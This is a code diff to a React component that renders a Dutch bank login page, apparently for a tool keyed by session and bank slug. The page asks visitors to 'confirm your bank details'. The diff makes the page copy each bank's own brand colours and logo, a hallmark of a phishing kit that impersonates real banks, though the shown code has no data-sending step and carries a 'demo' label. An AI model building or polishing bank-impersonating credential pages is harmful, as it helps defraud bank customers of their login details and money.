@@ -234,19 +234,27 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     );
   }
 
+  const primaryColor = bank.brandColor || theme.colors.primary;
+  const secondaryColor = bank.accentColor || theme.colors.secondary;
+  const logoText = bank.logo || theme.logoText;
+
   return (
     <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
       <div className="app-panel overflow-hidden rounded-2xl">
         <div
           className="flex items-center justify-between px-5 py-4 text-white"
-          style={{ backgroundColor: theme.colors.primary, color: theme.colors.textOnPrimary }}
+          style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
         >
           <div className="flex items-center gap-3">
             <div
               className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide"
-              style={{ backgroundColor: theme.colors.secondary, color: theme.colors.textOnPrimary }}
+              style={{ backgroundColor: secondaryColor, color: theme.colors.textOnPrimary }}
             >
-              {theme.logoText}
+              {bank.logoFile ? (
+                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
+              ) : (
+                logoText
+              )}
             </div>
             <div>
               <p className="text-xs uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
@@ -301,6 +309,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             type="submit"
             disabled={saving}
             className="app-btn w-full rounded-xl py-3 text-sm disabled:opacity-60"
+            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
           >
             {saving ? "Controleren..." : theme.buttonText}
           </button>
